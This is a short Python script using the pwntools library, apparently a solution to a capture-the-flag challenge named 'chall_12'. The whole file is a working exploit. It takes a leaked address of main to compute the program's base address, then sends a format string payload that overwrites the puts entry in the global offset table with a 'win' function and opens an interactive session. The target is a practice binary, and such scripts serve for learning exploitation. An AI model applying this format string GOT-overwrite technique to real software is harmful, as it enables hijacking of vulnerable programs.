# coding: utf-8
from pwn import *
def chall12():
    p=process("./chall_12")
    elf=ELF("./chall_12")
    p.recvuntil(":")
    leak=p.recv()
    main=int(leak,16)
    elf.address=main-elf.sym.main
    offset=7
    payload = fmtstr_payload(offset,{elf.got.puts:elf.sym.win})
    p.sendline(payload)
    p.interactive()
    
chall12()
